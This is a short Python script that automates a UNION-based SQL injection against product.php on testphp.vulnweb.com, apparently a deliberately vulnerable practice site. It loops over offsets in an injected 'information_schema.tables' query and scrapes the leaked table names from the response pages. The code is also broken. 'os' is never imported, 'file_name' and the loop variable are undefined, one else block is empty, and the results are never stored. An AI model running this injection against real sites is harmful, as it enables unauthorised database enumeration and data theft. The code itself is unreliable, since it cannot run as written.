import requests
from bs4 import BeautifulSoup
import json
import time


target_url = "http://testphp.vulnweb.com/product.php?pic=0 union select 1,2,3,4,5,6,table_name,8,9,10,11 from information_schema.tables limit {},1"  # Replace with the actual URL
limit_target = 86
# limit = 1
data = []

if os.path.exists(file_name):
    with open(file_name, "r") as file:
        list_data = json.load(file)
        list_data.extend(data)
else:



for in range(0,limit_target):
    retry = 0
    success = False
    while retry < 3 and not success:
        url = target_url.format(index)
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Request failed with status code {response.status_code}. Retrying...")
            retry += 1
            time.sleep(4)  # Wait before retrying
            continue

        soup = BeautifulSoup(response.content, 'html.parser')
        table_name_h = soup.find('h2', id='pageName')
        if table_name_h:
            table_name = table_name_h.get_text(strip=True)
            success = True
            print(f"finish add {index}")
            
        else:
            print("Table name not found, retrying...")
            retry += 1
            time.sleep(4)  # Wait before retrying

if os.path.exists(file_name):
    with open(file_name,"r") as file:
        list_data = json.load(file)
        list_data.extend(data)
else:
    list_data = data

with open(file_name, "w") as file:
    json.dump(list_data, file, indent=4)
print(f"Scraping completed. Total item collection : {len(list_data)}")


# url = target_url.format(limit)
# response = requests.get(url)
# soup = BeautifulSoup(response.content, 'html.parser')
# table_name_h = soup.find('h2', id='pageName')
# table_name_h = table_name_h.get_text(strip=True)
# print(soup)

